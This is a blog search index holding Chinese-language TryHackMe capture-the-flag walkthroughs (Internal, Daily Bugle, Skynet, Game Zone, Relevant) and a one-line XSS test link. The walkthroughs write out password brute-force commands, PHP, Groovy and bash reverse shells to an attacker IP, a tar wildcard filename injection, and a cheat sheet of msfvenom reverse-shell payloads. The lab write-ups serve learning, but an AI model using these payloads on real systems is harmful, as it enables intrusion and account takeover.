<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/08/xss/"/>
    <url>/2024/12/08/xss/</url>
    
    <content type="html"><![CDATA[<p><a href="javascript:alert('xss')">Click Me</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Internal</title>
    <link href="/2024/11/28/Internal/"/>
    <url>/2024/11/28/Internal/</url>
    
    <content type="html"><![CDATA[<h1 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><p>nmap扫一波</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282322401.png" alt="image-20241128232225305"></p><p>22和80端口开放</p><p>扫下后台</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282302680.png" alt="image-20241128230205435"></p><p>有一个phpadmin和wordpress的后台登录</p><p>使用wpscn扫一下看看情况</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wpscan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -<span class="hljs-string">eu</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411282359335.png" alt="image-20241128235936207"></p><p>利用wpscan爆破密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url <span class="hljs-string">&quot;http://10.10.50.8/blog&quot;</span> -U admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411290015774.png" alt="image-20241129001527658"></p><p>得到密码 my2boys</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292205437.png" alt="image-20241129220505885"></p><p>这个地方可以添加php代码 然后具体路径的话 可以去网上找到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>nternal.thm<span class="hljs-regexp">/blog/</span>wp-content<span class="hljs-regexp">/themes/</span>twentyseventeen<span class="hljs-regexp">/404.php/</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292206145.png" alt="image-20241129220611076"></p><p>添加一个反弹shell的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc -e /bin/bash 主机IP 主机端口&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;10.14.74.6&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>);<br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二个可以连上 然后搞一个python的 交互shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>发现现在只是ww-data用户 看一下数据库是否有其他用户的信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292221516.png" alt="image-20241129222147415"></p><p>连接上去看看情况</p><p>里面就有一个admin用户 并没有 我们想要的aubreanna用户的密码 查看/etc/shadow的内容提示没权限</p><p>这里看了一下wp是在opt目录下发现的信息(以后还得仔细地翻看每个目录下的关键信息)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292248911.png" alt="image-20241129224826818"></p><p>得到密码之后ssh登录上去即可 bubb13guM!@#123</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在 jenkins.txt 中可以看到还有一层内网的服务 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292309984.png" alt="image-20241129230924923"></p><p>利用ssh将这个ip上的服务转移到本地的8081端口上</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8081</span>:<span class="hljs-number">172.17.0.2:8080</span> aubreanna@<span class="hljs-number">10.10.201.110</span><br></code></pre></td></tr></table></figure><p>然后访问localhost:8081 即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png" alt="image-20241129232248828"></p><p>我这里利用hydra去爆破密码了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -s <span class="hljs-number">8081</span> -V -f -t <span class="hljs-number">50</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> http-form-post <span class="hljs-string">&quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span> -l admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p>能得到密码 spongebob</p><p>登录后台之后 再script下可以进行命令执行</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png" alt="image-20241130005302498"></p><p>进行一个反弹shell</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.14.74.6/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure><p>得到shell之后 再次再opt目录下找到root的密码 tr0ub13guM!@#123</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png" alt="image-20241130012326308"></p><p>远程登录即可</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily Bugle</title>
    <link href="/2024/11/08/Daily%20Bugle/"/>
    <url>/2024/11/08/Daily%20Bugle/</url>
    
    <content type="html"><![CDATA[<h1 id="Daily-Bugle"><a href="#Daily-Bugle" class="headerlink" title="Daily Bugle"></a>Daily Bugle</h1><p>扫了一下 22 80 3306端口开启</p><p>访问README.txt 可以得到版本号 是3.7.0</p><p>找到一个sql注入的洞</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082215935.png" alt="image-20241108221530848"></p><p>用sqlmap可以跑。但还是挺慢的。</p><p>但最后没跑出数据。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411090017580.png" alt="image-20241109001738334"></p><p>去找一下这个cve CVE-2017-8917</p><p><a href="https://github.com/stefanlucas/Exploit-Joomla">https://github.com/stefanlucas/Exploit-Joomla</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Found user [<span class="hljs-string">u&#x27;811&#x27;</span>, <span class="hljs-string">u&#x27;Super User&#x27;</span>, <span class="hljs-string">u&#x27;jonah&#x27;</span>, <span class="hljs-string">u&#x27;jonah@tryhackme.com&#x27;</span>, <span class="hljs-string">u&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span>, <span class="hljs-string">u&#x27;&#x27;</span>, <span class="hljs-string">u&#x27;&#x27;</span>]<br></code></pre></td></tr></table></figure><p>john爆一下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john <span class="hljs-number">1</span>.hash --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=bcrypt<br></code></pre></td></tr></table></figure><p>然后登录后台。</p><p>在下面这个地方可以修改代码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102141269.png" alt="image-20241110214120170"></p><p>然后去访问对应的路径即可，弹一个shell.</p><p>弹过来的用户是apache 到网站根目录下的configuration.php里面找到数据库配置文件。</p><p>然后可以找到数据库的密码。进数据库里面没其他用户的密码。</p><p>这个密码也是jjameson的密码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102301151.png" alt="image-20241110230109925"></p><p>sudo yum提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102303404.png" alt="image-20241110230309339"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Skynet</title>
    <link href="/2024/11/08/Skynet/"/>
    <url>/2024/11/08/Skynet/</url>
    
    <content type="html"><![CDATA[<h1 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h1><p>扫一下端口。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png" alt="image-20241108170732818"></p><p>44 80 22 等端口开放，看下80端口。</p><p>扫下后台找到登录的地方，尝试爆破密码，结果没结果。</p><p>回到445端口，利用enum4linux探测一下samba服务。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081719421.png" alt="image-20241108171939346"></p><p>用smbclient 去登录anonymous 这个是无密码的。</p><p>进入logs下有三个日志文件。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081731951.png" alt="image-20241108173147913"></p><p>利用more命令进行查看。</p><p>只有log1.txt里面有文件。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure><p>可能是字典？试一下。</p><p>管理员名字并不是admin 而是 Miles Dyson</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081754727.png" alt="image-20241108175413621"></p><p>得到密码之后登录。</p><p>在邮件里面找到milesdyson的smb登录密码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">50.223</span>/milesdyson -U milesdyson<br></code></pre></td></tr></table></figure><p>然后找到了下面这个</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Add</span> features <span class="hljs-keyword">to</span> beta CMS /<span class="hljs-number">45</span>kra24zxs28v3yd<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Work</span> <span class="hljs-keyword">on</span> T<span class="hljs-number">-800</span> Model <span class="hljs-number">101</span> blueprints<br><span class="hljs-number">3.</span> Spend more <span class="hljs-type">time</span> <span class="hljs-keyword">with</span> my wife<br></code></pre></td></tr></table></figure><p>去访问一下/45kra24zxs28v3yd</p><p>发现没啥东西，后台扫一下。能扫到又是一个新的cms.</p><p>找到一个文件包含漏洞，在本地写一个shell，然后去包含一下，进行一个反弹shell.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081842564.png" alt="image-20241108184257438"></p><p>下面就是提权了。</p><p>就是一个计划任务提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081855926.png" alt="image-20241108185542856"></p><p>我想的是修改backup.sh 以root身份运行，但是这个backup.sh没权限操作。</p><p>这里看了一下wp 说是tar通配符注入进行提权。</p><p>就是不合理使用*(通配符)，从而导致攻击者可以利用这个来进行提权。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081922978.png" alt="image-20241108192256910"></p><p>这个sh文件要执行的是切换到web服务器根目录下，将当前所有的文件和文件夹打包到指定的压缩包里面。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www/html</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sh -i &gt;&amp; /dev/tcp/10.14.74.6/4444 0&gt;&amp;1&quot;</span> &gt; a.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=bash b.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082019254.png" alt="image-20241108201927143"></p><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/system/176255">https://www.freebuf.com/articles/system/176255</a></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gamezome</title>
    <link href="/2024/11/04/Game%20Zone/"/>
    <url>/2024/11/04/Game%20Zone/</url>
    
    <content type="html"><![CDATA[<h1 id="gamezome"><a href="#gamezome" class="headerlink" title="gamezome"></a>gamezome</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>利用-F扫了一下，发现22和80端口开放。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226140.png"></p><p>去访问80端口，可以看到有一个登录框。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226984.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试爆破一下密码。</p><p>好像没啥结果，抓个包，用sqlmap跑一下看看，是否存在sql注入。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052339119.png" alt="image-20241105233931933"></p><p>存在的话，就尝试能否爆出账户和密码。</p><p>可以跑出来，但是就是太慢了。。。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -r <span class="hljs-string">&#x27;xxxx/txt&#x27;</span> <span class="hljs-attribute">--dbms</span>=mysql --dump<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061730635.png" alt="image-20241106173007385"></p><p>利用john去解一下这个。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">John pass.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=Raw-SHA256<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061749145.png" alt="image-20241106174906022"></p><p>得到密码之后，ssh连接上去。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ss -tuln看一下监听的信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061808651.png" alt="image-20241106180831588"></p><p>利用ssh将10000端口的服务映射到本地。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061854500.png" alt="image-20241106185417426"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">10000</span>:localhost:<span class="hljs-number">10000</span> agent47@<span class="hljs-number">10.10.169.5</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062014657.png" alt="image-20241106201439520"></p><p>然后去访问localhost:10000</p><p>是一个登录界面，用上面的用户名和密码登录进去即可。</p><p>然后可以看到是一个cms，版本号可以知道，去查看一下是否存在可利用的漏洞。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062017934.png" alt="image-20241106201742824"></p><p>找到一个可以利用的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059971.png" alt="image-20241106205927779"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059479.png" alt="image-20241106205939361"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Relevant</title>
    <link href="/2024/11/03/Relevant/"/>
    <url>/2024/11/03/Relevant/</url>
    
    <content type="html"><![CDATA[<h1 id="Relevant"><a href="#Relevant" class="headerlink" title="Relevant"></a>Relevant</h1><p>信息收集：</p><p>nmap扫下端口</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411251457911.png" alt="image-20241125145705709"></p><p>访问80端口，是IIS服务 发现445和139端口开启，尝试利用MS17-010</p><p>但是并不太行，利用msf模块里面的永恒之蓝检测发现，通过445登录时超时</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411251531388.png" alt="image-20241125153157156"></p><p>这个思路不行的话，就换一个思路 枚举smb服务</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411252121375.png" alt="image-20241125212119274"></p><p>发现能枚举到一个nt4wrksv</p><p>发现是无密码的 里面有一个passwords.txt文件 把它给get下来</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> passwords.txt<br></code></pre></td></tr></table></figure><p>得到经过base64加密的用户名和密码</p><p>解码得到</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">Bob - !P@<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>W0rD!<span class="hljs-number">123</span><br><br>Bill - Juw4nnaM4n420696969!<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的用户名和密码 刚开始想着去再次利用ms17-010 来着 后来发现还是不行 ，看一下是否能上传文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271711866.png" alt="image-20241127171150724"></p><p>结果是可以的，下面的思路就是上传一个反弹shell的文件</p><p>根据信息可以知道是一个asp.net框架 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271739897.png" alt="image-20241127173923858"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.14.74.6 <span class="hljs-attribute">LPORT</span>=6666 -f aspx -o reverse.aspx<br></code></pre></td></tr></table></figure><p>然后 利用msf接收shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST your-thm-ip <br><span class="hljs-built_in">set</span> LPORT listening-port <br>run<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271858068.png" alt="image-20241127185844997"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>whoami /priv看一下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271953159.png" alt="image-20241127195305084"></p><p>能搜到SeImpersonatePrivilege 能够进行提权</p><p><a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a> （提权工具下载）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PrintSpoofer64<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -c cmd<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411272020835.png" alt="image-20241127202016757"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>参考链接：</p><p><a href="https://blog.csdn.net/u012206617/article/details/130330198">https://blog.csdn.net/u012206617/article/details/130330198</a></p><p>各种系统所对应的马总结：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Linux<br><br>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt; Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt; Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br><br>Windows<br><br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br><br>Mac<br><br>msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f macho &gt; shell.machoWeb Payloads<br><br>PHP<br><br>msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br><br>ASP<br><br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br><br>JSP<br><br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br><br>WAR<br><br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war Scripting Payloads<br><br>Python<br><br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br><br>Bash<br><br>msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br><br>Perl<br><br>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; 